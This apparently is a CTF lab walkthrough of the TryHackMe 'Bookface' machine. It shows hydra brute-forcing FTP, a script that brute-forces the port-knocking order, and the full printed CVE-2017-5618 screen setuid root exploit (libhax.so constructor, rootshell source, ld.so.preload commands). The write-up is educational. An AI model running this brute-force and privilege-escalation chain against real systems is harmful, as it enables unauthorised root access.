---
title: "Bookface"
date: 2020-02-10T14:50:43+01:00
draft: false
tags: ["ctf", "tryhackme"]
categories: ["ctf", "tryhackme"]
---

Before we start, read more about following tools & vulnerabilities. It will contains in this CTF
- [hydra](https://www.cyberpunk.rs/password-cracker-thc-hydra)
- [screen](https://www.gnu.org/software/screen/) - [CVE-2017-5618](https://www.cvedetails.com/cve/CVE-2017-5618/)
- [knock](https://linux.die.net/man/1/knock)

and also you can read more about additional security method called [port knocking](https://www.howtogeek.com/442733/how-to-use-port-knocking-on-linux-and-why-you-shouldnt/)

So let's start as usual with __nmap__.
```bash
nmap -F --top-ports 10 -sV 10.10.219.90
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-10 16:37 CET
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Stats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Stats: 0:02:57 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.16% done; ETC: 16:40 (0:00:00 remaining)
Nmap scan report for 10.10.219.90
Host is up (0.38s latency).

PORT     STATE  SERVICE        VERSION
21/tcp   open   ftp            vsftpd 2.0.8 or later
22/tcp   closed ssh
23/tcp   open   telnet?
25/tcp   open   smtp?
80/tcp   open   http?
110/tcp  open   pop3?
139/tcp  open   netbios-ssn?
443/tcp  open   https?
445/tcp  open   microsoft-ds?
3389/tcp open   ms-wbt-server?
```

After scan, we can see many ports open, but only from FTP we have grabbed banner *vsftpd 2.0.8 or later*. 
From description of this game we know the developer's name: *Jerry*, so we can try brute force attack to FTP server.

```bash
$ hydra -ljerry -P /usr/share/dict/rockyou.txt ftp://10.10.219.90 -t 16  -vV                                        
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-02-10 16:28:50
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344409 login tries (l:1/p:14344409), ~896526 tries per task   
[DATA] attacking ftp://10.10.219.90:21/                   
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done                                                          
[ATTEMPT] target 10.10.219.90 - login "jerry" - pass "" - 1 of 14344409 [child 0] (0/0)                             
[ATTEMPT] target 10.10.219.90 - login "jerry" - pass "     " - 2 of 14344409 [child 1] (0/0)                        
[ATTEMPT] target 10.10.219.90 - login "jerry" - pass "      " - 3 of 14344409 [child 2] (0/0)                       
[ATTEMPT] target 10.10.219.90 - login "jerry" - pass "       " - 4 of 14344409 [child 3] (0/0)                      
[ATTEMPT] target 10.10.219.90 - login "jerry" - pass "        " - 5 of 14344409 [child 4] (0/0)                     
[ATTEMPT] target 10.10.219.90 - login "jerry" - pass "         " - 6 of 14344409 [child 5] (0/0)                    
[ATTEMPT] target 10.10.219.90 - login "jerry" - pass "          " - 7 of 14344409 [child 6] (0/0)                   
[ATTEMPT] target 10.10.219.90 - login "jerry" - pass "           " - 8 of 14344409 [child 7] (0/0)                  
[ATTEMPT] target 10.10.219.90 - login "jerry" - pass "            " - 9 of 14344409 [child 8] (0/0)                 
[ATTEMPT] target 10.10.219.90 - login "jerry" - pass "               " - 10 of 14344409 [child 9] (0/0)             
[ATTEMPT] target 10.10.219.90 - login "jerry" - pass "                  " - 11 of 14344409 [child 10] (0/0)         
...
[ATTEMPT] target 10.10.219.90 - login "jerry" - pass "prumpy" - 1 of 1 [child 0] (0/0)                                                                                                                                                  
[21][ftp] host: 10.10.219.90   login: jerry   password: prumpy                                                      
[STATUS] attack finished for 10.10.219.90 (waiting for children to complete tests)                                  
1 of 1 target successfully completed, 1 valid password found                                                        
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-02-10 16:28:01    
```

![Many hours later](https://i.kym-cdn.com/photos/images/original/000/401/463/ee2.png "Many hours later")

And voilà, we have a password: __prumpy__.
Connect to FTP with jerry:prumpy and let's find out what is hide inside.

```bash
$ ftp 10.10.219.90 
Connected to 10.10.219.90.
220 TryHackMe Networking CTF!
Name (10.10.219.90:burso): jerry
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> passive
Passive mode on.
ftp> ls
227 Entering Passive Mode (10,10,219,90,89,219).
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0              33 Feb 23  2019 flag1
-rw-rw-r--    1 1001     1001          141 Feb 23  2019 note
226 Directory send OK.
ftp> get flag1
227 Entering Passive Mode (10,10,219,90,89,226).
150 Opening BINARY mode data connection for flag1 (33 bytes).
226 Transfer complete.
33 bytes received in 0.000288 seconds (112 kbytes/s)
ftp> get note
227 Entering Passive Mode (10,10,219,90,89,216).
150 Opening BINARY mode data connection for note (141 bytes).
226 Transfer complete.
141 bytes received in 0.000263 seconds (524 kbytes/s)
```

Two files, first with flag, the second with some interesting notes.

```bash
$ cat flag1
79eb173ecb02d12d6d4832881be2cf23
```

- __FLAG1: 79eb173ecb02d12d6d4832881be2cf23__

```bash
$ cat note
Jerry, I finally got a chance to update our internal social media platform (bookface.com).

Can you signup and like my doggo photos?

Thanks
```

Ouu, there is also some domain, lets look on it, if we can find there something interesting.
After couple of requests to different types of DNS records, I found the the right one. 
In TXT record there are flag and also some ports, but wait. Why was there so many ports open?

```bash
host -t txt bookface.com 10.10.219.90                   
Using domain server:     
Name: 10.10.219.90
Address: 10.10.219.90#53
Aliases:          
                            
bookface.com descriptive text "Ports: 6786 9893 8748 3443 - Who cares about order tho right?"
bookface.com descriptive text "Flag2:a17f17ba86d8271da60ed8436667f412"
```

- __FLAG2: a17f17ba86d8271da60ed8436667f412__

It looks like port knocking now. But according to comment we don't know order of ports, 
so I wrote port-knocking-enumeration to brute force the order.

source: port-knocking-enumeration.sh
```bash
#!/bin/bash

porta=(8748 3443 6786 9893)
portb=(6786 9893 8748 3443)
portc=(9893 8748 3443 6786)
portd=(3443 6786 9893 8748)
ip="10.10.213.66"

for a in ${porta[@]}; do
        for b in ${portb[@]}; do
                for c in ${portc[@]}; do
                        for d in ${portd[@]}; do
                                echo "$a $b $c $d"
                                knock $ip $a $b $c $d && nmap -p 22 $ip 2>&1 | grep "open" && echo "[SUCCESS!!] $a $b $c $d" && exit
                                sleep 1
                        done
                done
        done
done
```

Let's brute force it!

```bash
$ ./port-knocking-enumeration.sh 
8748 6786 9893 3443
8748 6786 9893 6786
8748 6786 9893 9893
8748 6786 9893 8748
8748 6786 8748 3443
8748 6786 8748 6786
8748 6786 8748 9893
8748 6786 8748 8748
8748 6786 3443 3443
8748 6786 3443 6786
8748 6786 3443 9893
8748 6786 3443 8748
8748 6786 6786 3443
8748 6786 6786 6786
8748 6786 6786 9893
8748 6786 6786 8748
8748 9893 9893 3443
8748 9893 9893 6786
8748 9893 9893 9893
8748 9893 9893 8748
8748 9893 8748 3443
8748 9893 8748 6786
8748 9893 8748 9893
8748 9893 8748 8748
8748 9893 3443 3443
8748 9893 3443 6786
8748 9893 3443 9893
8748 9893 3443 8748
8748 9893 6786 3443
22/tcp open  ssh
[SUCCESS!!] 8748 9893 6786 3443
```

Now we have the right order! We can verify it..

```bash
$ knock 10.10.213.66 8748 9893 6786 3443 && nmap -sV -p22 10.10.213.66
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-10 19:55 CET
Nmap scan report for 10.10.213.66
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.12 seconds
```

aand connect to ssh. Password is same as on FTP of course ;)

```bash
$ knock 10.10.213.66 8748 9893 6786 3443 && ssh jerry@10.10.213.66
jerry@10.10.213.66's password: 
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.4.0-1072-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  Get cloud support with Ubuntu Advantage Cloud Guest:
    http://www.ubuntu.com/business/services/cloud

73 packages can be updated.
48 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sat Feb 23 22:17:39 2019 from 10.0.0.20
jerry@ip-10-10-213-66:~$ 
```

We're in, so let's find another flag.

```bash
jerry@ip-10-10-213-66:/home$ find / -name "flag3" 2>/dev/null
/home/flag3
jerry@ip-10-10-213-66:/home$ cat /home/flag3 
dd059316033c59f00057e5552140f831
```

- __FLAG3: dd059316033c59f00057e5552140f831__

Okey, that was pretty easy, but for the last one flag we will need the root priviledges.
So how to find vulnerability to gain the root priviledges? Let's search some binaries with
[setuid bit flag](https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits).

```bash
jerry@ip-10-10-140-162:/etc$ find / -perm -u=s -type f 2>/dev/null
/snap/core/5742/bin/mount                                
/snap/core/5742/bin/ping
/snap/core/5742/bin/ping6
/snap/core/5742/bin/su
/snap/core/5742/bin/umount
/snap/core/5742/usr/bin/chfn 
/snap/core/5742/usr/bin/chsh 
/snap/core/5742/usr/bin/gpasswd
/snap/core/5742/usr/bin/newgrp
...
/bin/umount
/bin/fusermount
/bin/ntfs-3g
/bin/ping
/bin/su
/bin/ping6
/bin/screen-4.5.0/screen-4.05.0
/bin/mount
```

only *screen* has a version in a name of file and that's interesting. 
We can look at the internet and find the exploit if exists. 
The best way how to find the correct exploit and not malware :) 
is on [exploit-db](https://www.exploit-db.com) website from offensive-security.

I found one that could works. 
[exploit](https://www.exploit-db.com/exploits/41154)


```bash
$ cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF

$ gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c                                                      
$ ls /tmp/                                          
$ cat << EOF > /tmp/rootshell.c                                                                               
#include <stdio.h>                                       
int main(void){                                          
    setuid(0);                                           
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);                       
}        
EOF    
                            
$ gcc -o /tmp/rootshell /tmp/rootshell.c
$ cd /etc/
$ umask 000
$ screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"                                                
$ /bin/screen-4.5.0/screen-4.05.0 -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"                       
$ /tmp/rootshell 
```
And now we have root priviledges, so let's take the last one flag.

```bash
# cat /root/flag4
6b873b86b1f3eb170554af54fddb8267
```

- __FLAG4: 6b873b86b1f3eb170554af54fddb8267__

I hope you enjoy the game and learn something new.
Bye;)
